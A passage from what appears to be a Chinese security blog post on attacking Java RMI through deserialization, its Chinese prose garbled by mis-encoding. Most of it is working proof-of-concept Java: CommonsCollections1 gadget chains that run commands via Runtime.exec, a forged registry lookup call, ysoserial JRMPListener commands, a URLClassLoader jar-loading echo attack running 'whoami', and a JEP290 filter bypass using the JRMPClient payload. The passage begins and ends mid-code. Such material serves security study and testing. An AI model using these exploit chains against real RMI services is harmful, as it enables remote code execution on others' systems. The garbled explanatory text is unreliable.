UnmarshalException(error unmarshalling arguments, var81); catch (ClassNotFoundException var82) throw new UnmarshalException(error unmarshalling arguments, var82); finally var2.releaseInputStream(); var6.unbind(var7); è¿™ä¸¤ä¸ªcaseä¸­ä¹Ÿæœ‰readObjectï¼Œä½†æ˜¯å’Œä¸Šé¢bindæ–¹æ³•ä¸ä¸€æ ·çš„æ˜¯åªèƒ½å¤Ÿä¼ å…¥Stringç±»å‹ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ªé€ è¿æ¥è¯·æ±‚è¿›è¡Œåˆ©ç”¨ï¼Œä¿®æ”¹lookupæ–¹æ³•ä»£ç ä½¿å…¶å¯ä»¥ä¼ å…¥å¯¹è±¡ï¼ŒRegistry_Stubçš„lookupæ–¹æ³•å†…å®¹å¦‚ä¸‹ï¼š public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException try RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L); try ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(var1); catch (IOException var18) throw new MarshalException(error marshalling arguments, var18); super.ref.invoke(var2); Remote var23; try ObjectInput var6 = var2.getInputStream(); var23 = (Remote)var6.readObject(); catch (IOException var15) throw new UnmarshalException(error unmarshalling return, var15); catch (ClassNotFoundException var16) throw new UnmarshalException(error unmarshalling return, var16); finally super.ref.done(var2); return var23; catch (RuntimeException var19) throw var19; catch (RemoteException var20) throw var20; catch (NotBoundException var21) throw var21; catch (Exception var22) throw new UnexpectedException(undeclared checked exception, var22); Pocå¦‚ä¸‹ï¼š import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import sun.rmi.server.UnicastRef;import java.io.ObjectOutput;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.rmi.Remote;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.Operation;import java.rmi.server.RemoteCall;import java.rmi.server.RemoteObject;import java.util.HashMap;import java.util.Map;public class ClientPoc public static void main(String[] args) throws Exception Transformer[] transformers = new Transformer[] new ConstantTransformer(Runtime.class), new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,null), new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null), new InvokerTransformer(exec, new Class[]String.class, new Object[]calc) ; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMapObject, Object map = new HashMap(); map.put(value, b); MapObject, Object transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Class c = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object o = ctor.newInstance(Target.class, transformedMap); Registry registry = LocateRegistry.getRegistry(127.0.0.1,1099); Remote r = Remote.class.cast(Proxy.newProxyInstance( Remote.class.getClassLoader(), new Class[] Remote.class , (InvocationHandler) o)); // è·å–ref //registry.getClass().getSuperclass().getSuperclass()ä¸ºregistryå¯¹è±¡çš„çˆ¶ç±»çš„çˆ¶ç±» Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields(); fields_0[0].setAccessible(true); UnicastRef ref = (UnicastRef) fields_0[0].get(registry); //è·å–operations Field[] fields_1 = registry.getClass().getDeclaredFields(); fields_1[0].setAccessible(true); Operation[] operations = (Operation[]) fields_1[0].get(registry); // ä¼ªé€ lookupçš„ä»£ç ï¼Œå»ä¼ªé€ ä¼ è¾“ä¿¡æ¯ RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L); ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(r); ref.invoke(var2); è‡ªå·±è°ƒè¯•å¯ä»¥å‘ç°å³ä½¿å®¢æˆ·ç«¯è¿™è¾¹æ²¡æœ‰æ˜¾å¼è°ƒç”¨lookupæ–¹æ³•ï¼Œä½†æ˜¯æœåŠ¡ç«¯ä¾ç„¶ä¼šèµ°åˆ°RegistryImpl_Skel.classæ–‡ä»¶ä¸­çš„dispatchæ–¹æ³•ä¸­ åœ¨æœåŠ¡ç«¯è¿™è¾¹æ¥å—åˆ°çš„å‚æ•°var2ä¸ºä¸€ä¸ªç±»å¯¹è±¡ï¼Œå¼ºè½¬ä¸ºStringå¯¹è±¡ä¼šå¤±è´¥ï¼Œä½†æ˜¯åœ¨å¼ºè½¬ä¹‹å‰ä»¥å‰å¯¹var10è¿›è¡Œååºåˆ—åŒ–äº†ï¼Œä¼šæ­£å¸¸å¼¹çª— var10 = var2.getInputStream();var7 = (String)var10.readObject(); æ”»å‡»å®¢æˆ·ç«¯æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯æ­¤æ–¹æ³•å¯ä»¥æ”»å‡»å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ å¯¹äºæ³¨å†Œä¸­å¿ƒæ¥è¯´ï¼Œæˆ‘ä»¬è¿˜æ˜¯ä»è¿™å‡ ä¸ªæ–¹æ³•è§¦å‘ï¼š bind unbind rebind list lookup é™¤äº†unbindå’Œrebindéƒ½ä¼šè¿”å›æ•°æ®ç»™å®¢æˆ·ç«¯ï¼Œè¿”å›çš„æ•°æ®æ˜¯åºåˆ—åŒ–å½¢å¼ï¼Œé‚£ä¹ˆåˆ°äº†å®¢æˆ·ç«¯å°±ä¼šè¿›è¡Œååºåˆ—åŒ–ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶æ³¨å†Œä¸­å¿ƒçš„è¿”å›æ•°æ®ï¼Œé‚£ä¹ˆå°±èƒ½å®ç°å¯¹å®¢æˆ·ç«¯çš„æ”»å‡»ï¼Œè¿™é‡Œä½¿ç”¨ysoserialçš„JRMPListenerï¼Œå‘½ä»¤å¦‚ä¸‹ java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections1 calc exploit.JRMPListenerï¼šä½¿ç”¨æ—¶æ­é…ä»»æ„çš„gadgetï¼ˆå¦‚CommonCollections1ï¼‰ç”Ÿæˆç¬¬äºŒæ¬¡ååºåˆ—åŒ–çš„payloadï¼Œå¹¶ä¼šåœ¨æ”»å‡»æœºç›‘å¬ä¸€ä¸ªæŒ‡å®šçš„ç«¯å£ ç„¶åä½¿ç”¨å®¢æˆ·ç«¯å»è®¿é—® import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Client public static void main(String[] args) throws Exception Registry registry = LocateRegistry.getRegistry(127.0.0.1,12345); registry.list(); å°±æˆåŠŸå®ç°å®¢æˆ·ç«¯çš„RCE è¿™é‡Œå³ä½¿è°ƒç”¨unbindä¹Ÿä¼šè§¦å‘ååºåˆ—åŒ–ï¼Œæ¨æµ‹æ˜¯åœ¨ä¹‹å‰ä¼ è¾“ä¸€äº›çº¦å®šå¥½çš„æ•°æ®æ—¶è¿›è¡Œçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚æ‰€ä»¥å®é™…ä¸Šè¿™äº”ç§æ–¹æ³•éƒ½å¯ä»¥è¾¾åˆ°æ³¨å†Œä¸­å¿ƒåæ‰“å®¢æˆ·ç«¯æˆ–æœåŠ¡ç«¯çš„ç›®çš„ æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯ï¼Œå¤§æŠµå¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§æƒ…æ™¯ã€‚ 1.æœåŠ¡ç«¯è¿”å›å‚æ•°ä¸ºObjectå¯¹è±¡2.è¿œç¨‹åŠ è½½å¯¹è±¡ æœåŠ¡ç«¯è¿”å›å‚æ•°ä¸ºObjectå¯¹è±¡åœ¨RMIä¸­ï¼Œè¿œç¨‹è°ƒç”¨æ–¹æ³•ä¼ é€’å›æ¥çš„ä¸ä¸€å®šæ˜¯ä¸€ä¸ªåŸºç¡€æ•°æ®ç±»å‹ï¼ˆStringã€intï¼‰ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯å¯¹è±¡ï¼Œå½“æœåŠ¡ç«¯è¿”å›ç»™å®¢æˆ·ç«¯ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå®¢æˆ·ç«¯å°±è¦å¯¹åº”çš„è¿›è¡Œååºåˆ—åŒ–ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¼ªé€ ä¸€ä¸ªæœåŠ¡ç«¯ï¼Œå½“å®¢æˆ·ç«¯è°ƒç”¨æŸä¸ªè¿œç¨‹æ–¹æ³•æ—¶ï¼Œè¿”å›çš„å‚æ•°æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„æ¶æ„å¯¹è±¡ã€‚è¿™é‡Œä»¥cc1ä¸ºä¾‹ ååºåˆ—åŒ–çš„åˆ©ç”¨ç‚¹å°±æ˜¯UnicastRefçš„unmarshalValueæ–¹æ³• æ¶æ„ç±»LocalUser import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.util.HashMap;import java.util.Map;public class LocalUser extends UnicastRemoteObject implements User public String name; public int age; public LocalUser(String name, int age) throws RemoteException super(); this.name = name; this.age = age; @Override public Object getUser() Object o = null; try Transformer[] transformers = new Transformer[] new ConstantTransformer(Runtime.class), new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,null), new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null), new InvokerTransformer(exec, new Class[]String.class, new Object[]calc) ; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMapObject, Object map = new HashMap(); map.put(value, b); MapObject, Object transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Class c = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); o = ctor.newInstance(Target.class, transformedMap); catch(Exception e) e.printStackTrace(); return o; Useræ¥å£ import java.rmi.Remote;import java.rmi.RemoteException;public interface User extends Remote public Object getUser() throws RemoteException; æœåŠ¡ç«¯ import java.rmi.AlreadyBoundException;import java.rmi.NotBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.concurrent.CountDownLatch;public class Server public static void main(String[] args) throws RemoteException, AlreadyBoundException, InterruptedException, NotBoundException User liming = new LocalUser(liming,15); Registry registry = LocateRegistry.createRegistry(1099); registry.bind(user,liming); //ä½¿ç”¨CountDownLatchä¿æŒæœåŠ¡è¿è¡Œ CountDownLatch latch=new CountDownLatch(1); latch.await(); å®¢æˆ·ç«¯ import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIClient public static void main(String[] args) throws Exception Registry registry = LocateRegistry.getRegistry(127.0.0.1,1099); User user = (User) registry.lookup(user); user.getUser(); å½“å®¢æˆ·ç«¯è°ƒç”¨æœåŠ¡ç«¯ç»‘å®šçš„è¿œç¨‹å¯¹è±¡çš„getUseræ–¹æ³•æ—¶ï¼Œå°†ååºåˆ—åŒ–æœåŠ¡ç«¯ä¼ æ¥çš„æ¶æ„è¿œç¨‹å¯¹è±¡ã€‚(è¯¥è¿‡ç¨‹åœ¨ä¸Šä¸€ç¯‡è¯¦ç»†è°ƒè¯•RMIæµç¨‹ä¸­æœ‰åˆ†æè¿‡ï¼‰æ­¤æ—¶å°†è§¦å‘RCE è¿œç¨‹åŠ è½½å¯¹è±¡è¿™ä¸ªæ¡ä»¶ååˆ†ååˆ†è‹›åˆ»ï¼Œåœ¨ç°å®ç”Ÿæ´»ä¸­åŸºæœ¬ä¸å¯èƒ½ç¢°åˆ°ã€‚ å½“æœåŠ¡ç«¯çš„æŸä¸ªæ–¹æ³•è¿”å›çš„å¯¹è±¡æ˜¯å®¢æˆ·ç«¯æ²¡æœ‰çš„æ—¶ï¼Œå®¢æˆ·ç«¯å¯ä»¥æŒ‡å®šä¸€ä¸ªURLï¼Œæ­¤æ—¶ä¼šé€šè¿‡URLæ¥å®ä¾‹åŒ–å¯¹è±¡ã€‚ å…·ä½“å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œåˆ©ç”¨æ¡ä»¶å¤ªè¿‡äºè‹›åˆ»äº†ï¼šhttps://paper.seebug.org/1091/#serverrmi-server java.security.policyè¿™ä¸ªé»˜è®¤æ˜¯æ²¡æœ‰é…ç½®çš„ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨å»é…ç½® æ”»å‡»æœåŠ¡ç«¯ä¸Šé¢æœ‰ä»‹ç»é€šè¿‡æ³¨å†Œä¸­å¿ƒæ¥æ”»å‡»å®¢æˆ·ç«¯çš„æ–¹æ³•ï¼ŒåŒæ ·çš„æ–¹æ³•ä¹Ÿå¯ä»¥æ”»å‡»æœåŠ¡ç«¯ï¼Œä½†æ˜¯ç”¨å¤„ä¸å¤§ï¼Œä¸‹é¢ä»‹ç»çš„æ˜¯å®¢æˆ·ç«¯æ”»å‡»æœåŠ¡ç«¯çš„æ–¹å¼ æœåŠ¡ç«¯çš„è¿œç¨‹æ–¹æ³•å­˜åœ¨Objectå‚æ•°å¦‚æœæœåŠ¡ç«¯çš„æŸä¸ªæ–¹æ³•ï¼Œä¼ é€’çš„å‚æ•°æ˜¯Objectç±»å‹çš„å‚æ•°ï¼Œå½“æœåŠ¡ç«¯æ¥æ”¶æ•°æ®æ—¶ï¼Œå°±ä¼šè°ƒç”¨readObjectï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»è¿™ä¸ªè§’åº¦å…¥æ‰‹æ¥æ”»å‡»æœåŠ¡ç«¯ æ·»åŠ ä¸€ä¸ªaddUseræ–¹æ³•ï¼Œæ¥å—çš„æ˜¯Objectç±»å‹çš„å‚æ•° import java.rmi.Remote;import java.rmi.RemoteException;public interface User extends Remote public Object getUser() throws RemoteException; public void addUser(Object user) throws RemoteException; å½“å®¢æˆ·ç«¯è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯ä¼šå¯¹ä¼ é€’è¿‡æ¥çš„å‚æ•°è¿›è¡Œååºåˆ—åŒ– å®¢æˆ·ç«¯ import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.HashMap;import java.util.Map;public class RMIClient public static void main(String[] args) throws Exception Transformer[] transformers = new Transformer[] new ConstantTransformer(Runtime.class), new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,null), new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null), new InvokerTransformer(exec, new Class[]String.class, new Object[]calc) ; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMapObject, Object map = new HashMap(); map.put(value, b); MapObject, Object transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Class c = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object o = ctor.newInstance(Target.class, transformedMap); Registry registry = LocateRegistry.getRegistry(127.0.0.1,1099); User user = (User) registry.lookup(user); user.addUser(o); æœåŠ¡ç«¯å¤„æˆåŠŸå¼¹çª— è¿œç¨‹åŠ è½½å¯¹è±¡å’Œä¸Šè¾¹Serveræ‰“Clientä¸€æ ·åˆ©ç”¨æ¡ä»¶éå¸¸è‹›åˆ»ã€‚ å‚è€ƒï¼šhttps://paper.seebug.org/1091/#serverrmi åˆ©ç”¨URLClassLoaderå®ç°å›æ˜¾æ”»å‡»æ”»å‡»æ³¨å†Œä¸­å¿ƒæ—¶ï¼Œæ³¨å†Œä¸­å¿ƒé‡åˆ°å¼‚å¸¸ä¼šç›´æ¥æŠŠå¼‚å¸¸å‘å›æ¥ï¼Œè¿”å›ç»™å®¢æˆ·ç«¯ã€‚è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨URLClassLoaderåŠ è½½è¿œç¨‹jarï¼Œä¼ å…¥æœåŠ¡ç«¯ï¼Œååºåˆ—åŒ–åè°ƒç”¨å…¶æ–¹æ³•ï¼Œåœ¨æ–¹æ³•å†…æŠ›å‡ºé”™è¯¯ï¼Œé”™è¯¯ä¼šä¼ å›å®¢æˆ·ç«¯ è¿œç¨‹demo: import java.io.BufferedReader;import java.io.InputStreamReader;public class ErrorBaseExec public static void do_exec(String args) throws Exception //Processå¯¹è±¡ï¼šç”¨äºè·å–å‘½ä»¤æ‰§è¡Œçš„è¾“å…¥ã€è¾“å‡ºæˆ–é”™è¯¯æµ Process proc = Runtime.getRuntime().exec(args); //proc.getInputStream()ï¼šè·å–å­è¿›ç¨‹ï¼ˆå‘½ä»¤ï¼‰æ‰§è¡Œåçš„æ ‡å‡†è¾“å‡ºæµ //BufferedReader å’Œ InputStreamReaderï¼šå°†å­è¿›ç¨‹è¾“å‡ºçš„å­—èŠ‚æµé€è¡Œè¯»å–å¹¶å­˜å‚¨ BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream())); StringBuffer sb = new StringBuffer(); String line; //æ¯æ¬¡è¯»å–ä¸€è¡Œï¼Œå°†å…¶æ‹¼æ¥åˆ°StringBufferä¸­ï¼Œæœ€ç»ˆè·å–å®Œæ•´çš„è¾“å‡ºå†…å®¹ while ((line = br.readLine()) != null) sb.append(line).append( ); //æ„é€ å¼‚å¸¸å¹¶æŠ›å‡º String result = sb.toString(); Exception e=new Exception(result); throw e; //å°†å¼‚å¸¸æŠ›å‡ºåˆ°è°ƒç”¨æ–¹æ³•çš„ä½ç½® è¯¥ä»½ä»£ç çš„æ ¸å¿ƒæ˜¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¹¶å°†æ‰§è¡Œç»“æœä½œä¸ºå¼‚å¸¸ä¿¡æ¯æŠ›å‡º åœ¨åŒä¸€çº§ç›®å½•ä¸‹é¢é€šè¿‡ä¸‹é¢ä¸¤ä¸ªå‘½ä»¤åˆ¶ä½œæˆjaråŒ… javac ErrorBaseExec.javajar -cvf RMIexploit.jar ErrorBaseExec.class å®¢æˆ·ç«¯POC: import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.net.URLClassLoader;import java.rmi.Remote;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.HashMap;import java.util.Map;public class ClientPoc public static Constructor? getFirstCtor(final String name) throws Exception final Constructor? ctor = Class.forName(name).getDeclaredConstructors()[0]; ctor.setAccessible(true); return ctor; public static void main(String[] args) throws Exception String ip = 127.0.0.1; //æ³¨å†Œä¸­å¿ƒip int port = 1099; //æ³¨å†Œä¸­å¿ƒç«¯å£ String remotejar = file:///E:\\\\mycode\\\\java_max\\\\lab_3\\\\RMIClient\\\\src\\\\main\\\\java\\\\RMIexploit.jar; String command = whoami; final String ANN_INV_HANDLER_CLASS = sun.reflect.annotation.AnnotationInvocationHandler; try final Transformer[] transformers = new Transformer[] new ConstantTransformer(java.net.URLClassLoader.class), new InvokerTransformer(getConstructor, new Class[] Class[].class , new Object[] new Class[] java.net.URL[].class ), new InvokerTransformer(newInstance, new Class[] Object[].class , new Object[] new Object[] new java.net.URL[] new java.net.URL(remotejar) ), new InvokerTransformer(loadClass, new Class[] String.class , new Object[] ErrorBaseExec ), new InvokerTransformer(getMethod, new Class[] String.class, Class[].class , new Object[] do_exec, new Class[] String.class ), new InvokerTransformer(invoke, new Class[] Object.class, Object[].class , new Object[] null, new String[] command ) ; Transformer transformedChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(value, value); Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain); Class cl = Class.forName( sun.reflect.annotation.AnnotationInvocationHandler); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(Target.class, outerMap); Registry registry = LocateRegistry.getRegistry(ip, port); InvocationHandler h = (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS) .newInstance(Target.class, outerMap); Remote r = Remote.class.cast(Proxy.newProxyInstance( Remote.class.getClassLoader(), new Class[] Remote.class , h)); registry.bind(liming, r); catch (Exception e) try System.out.print(e.getCause().getCause().getCause().getMessage()); catch (Exception ee) throw e; æ‰§è¡ŒåæˆåŠŸè¿”å› JEP290åŠå…¶ç»•è¿‡JEP290ä»‹ç»JEP290æœºåˆ¶æ˜¯ç”¨æ¥è¿‡æ»¤ä¼ å…¥çš„åºåˆ—åŒ–æ•°æ®ï¼Œä»¥æé«˜å®‰å…¨æ€§ï¼Œåœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œæ–°å¢äº†ä¸€ä¸ªfilterCheckæ–¹æ³•ï¼Œæ‰€ä»¥ï¼Œä»»ä½•ååºåˆ—åŒ–æ“ä½œéƒ½ä¼šç»è¿‡è¿™ä¸ªfilterCheckæ–¹æ³•ï¼Œåˆ©ç”¨checkInputæ–¹æ³•æ¥å¯¹åºåˆ—åŒ–æ•°æ®è¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸åˆæ ¼çš„æ£€æµ‹ï¼ŒFilterå°†è¿”å›REJECTEDã€‚ä½†æ˜¯jep290çš„filteréœ€è¦æ‰‹åŠ¨è®¾ç½®ï¼Œé€šè¿‡setObjectInputFilteræ¥è®¾ç½®filterï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œè¿˜æ˜¯ä¸ä¼šæœ‰ç™½åå• private static Status registryFilter(FilterInfo var0) if (registryFilter != null) Status var1 = registryFilter.checkInput(var0); if (var1 != Status.UNDECIDED) return var1; if (var0.depth() (long)REGISTRY_MAX_DEPTH) return Status.REJECTED; else Class var2 = var0.serialClass(); if (var2 == null) return Status.UNDECIDED; else if (var2.isArray()) if (var0.arrayLength() = 0L var0.arrayLength() (long)REGISTRY_MAX_ARRAY_SIZE) return Status.REJECTED; do var2 = var2.getComponentType(); while(var2.isArray()); if (var2.isPrimitive()) return Status.ALLOWED; else return String.class != var2 !Number.class.isAssignableFrom(var2) !Remote.class.isAssignableFrom(var2) !Proxy.class.isAssignableFrom(var2) !UnicastRef.class.isAssignableFrom(var2) !RMIClientSocketFactory.class.isAssignableFrom(var2) !RMIServerSocketFactory.class.isAssignableFrom(var2) !ActivationID.class.isAssignableFrom(var2) !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED; ä¹Ÿå°±æ˜¯è¯´åªæœ‰ä»¥ä¸‹å‡ ç§ç±»èƒ½å¤Ÿååºåˆ—åŒ– String.classRemote.classProxy.classUnicastRef.classRMIClientSocketFactory.classRMIServerSocketFactory.classActivationID.classUID.class JEP290æœ¬èº«æ˜¯JDK9çš„äº§ç‰©ï¼Œä½†æ˜¯Oracleå®˜æ–¹åšäº†å‘ä¸‹ç§»æ¤çš„å¤„ç†ï¼ŒæŠŠJEP290çš„æœºåˆ¶ç§»æ¤åˆ°äº†ä»¥ä¸‹ä¸‰ä¸ªç‰ˆæœ¬ä»¥åŠå…¶ä¿®å¤åçš„ç‰ˆæœ¬ä¸­ï¼š Javaâ„¢ SE Development Kit 8, Update 121 (JDK 8u121) Javaâ„¢ SE Development Kit 7, Update 131 (JDK 7u131) Javaâ„¢ SE Development Kit 6, Update 141 (JDK 6u141) ä»¥8u131ä½œä¸ºæµ‹è¯• ä¼šè¢«æ‹¦æˆªï¼Œå¹¶è¿”å›REJECTED ç»•è¿‡ç»•è¿‡çš„æ€è·¯åœ¨ä¸Šä¸€ç¯‡RMIçš„æ–‡ç« ä¸­è®²è¿‡äº†ï¼Œå°±æ˜¯åˆ©ç”¨ç±»UnicastRef æ¥çœ‹çœ‹ysoä¸­çš„JRMPClientï¼š package ysoserial.payloads;import java.lang.reflect.Proxy;import java.rmi.registry.Registry;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.PayloadRunner;@SuppressWarnings ( restriction )@PayloadTest( harness=ysoserial.test.payloads.JRMPReverseConnectSMTest)@Authors( Authors.MBECHLER )public class JRMPClient extends PayloadRunner implements ObjectPayloadRegistry public Registry getObject ( final String command ) throws Exception String host; int port; int sep = command.indexOf(:); if ( sep 0 ) port = new Random().nextInt(65535); host = command; else host = command.substring(0, sep); port = Integer.valueOf(command.substring(sep + 1)); ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(host, port); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] Registry.class , obj); return proxy; public static void main ( final String[] args ) throws Exception Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader()); PayloadRunner.run(JRMPClient.class, args); å…¶ä¸­çš„ä»£ç ï¼š ObjID id = new ObjID(new Random().nextInt()); // RMI registryTCPEndpoint te = new TCPEndpoint(host, port);UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] Registry.class, obj);return proxy; è¿”å›äº†ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œä¸Šé¢ä»£ç ä¸­ç”¨åˆ°çš„ç±»å…¨éƒ¨éƒ½åœ¨ç™½åå•ï¼Œæ³¨å†Œä¸­å¿ƒååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨åˆ°RemoteObjectInvacationHandlerçˆ¶ç±»RemoteObjectçš„readObjectæ–¹æ³•ï¼ˆå› ä¸ºRemoteObjectInvacationHandleræ²¡æœ‰readObjectæ–¹æ³•ï¼‰ï¼Œåœ¨readObjecté‡Œçš„æœ€åä¸€è¡Œä¼šè°ƒç”¨ref.readExternalæ–¹æ³•ï¼Œå¹¶å°†ObjectInputStreamä¼ è¿›å»ï¼š æˆ‘ä»¬çŸ¥é“refæ˜¯UnicastRefï¼Œæ‰€ä»¥ä¼šè°ƒç”¨è¯¥ç±»ä¸­çš„readExternalæ–¹æ³• public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException this.ref = LiveRef.read(var1, false); è°ƒç”¨äº†LiveRefä¸­çš„readæ–¹æ³• è¿™é‡Œåœ¨ä¸Šè¾¹ä¼šæŠŠLiveRefå¯¹è±¡è¿˜åŸï¼ŒLiveRefå¯¹è±¡ä¸­å­˜äº†æˆ‘ä»¬åºåˆ—åŒ–è¿›å»çš„ipå’Œç«¯å£ï¼Œä¹‹åä¼šè°ƒç”¨DGCClient#registerRefs static void registerRefs(Endpoint var0, ListLiveRef var1) DGCClient.EndpointEntry var2; do var2 = DGCClient.EndpointEntry.lookup(var0); while(!var2.registerRefs(var1)); ä¼šè°ƒåˆ°DGCClient#makeDirtyCallï¼Œå¹¶æŠŠvar2ä¼ è¿›å»ï¼Œvar2é‡Œå°è£…äº†æˆ‘ä»¬çš„endpointä¿¡æ¯ Lease var7 = this.dgc.dirty(var4, var2, new Lease(DGCClient.vmid, DGCClient.leaseValue)); æœ€åå°±æ˜¯æˆ‘ä»¬è‡ªå·±åˆ›å»ºäº†çš„dgcä¼šè°ƒç”¨dirtyæ–¹æ³•ï¼ˆä¸­é—´çš„æµç¨‹åœ¨RMIé‚£ç¯‡æ–‡ç« å†™çš„æŒºé€å½»çš„äº†ï¼‰ï¼Œvar4æ˜¯æˆ‘ä»¬ä¼ è¿›å»çš„ObjIDå¯¹è±¡ï¼Œvar1æ˜¯ä¸€ä¸ªHashSetå¯¹è±¡ï¼Œé‡Œè¾¹å­˜äº†æˆ‘ä»¬çš„Endpointä¿¡æ¯ public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException try RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L); try ObjectOutput var6 = var5.getOutputStream(); var6.writeObject(var1); var6.writeLong(var2); var6.writeObject(var4); catch (IOException var20) throw new MarshalException(error marshalling arguments, var20); super.ref.invoke(var5); try ObjectInput var9 = var5.getInputStream(); var24 = (Lease)var9.readObject(); 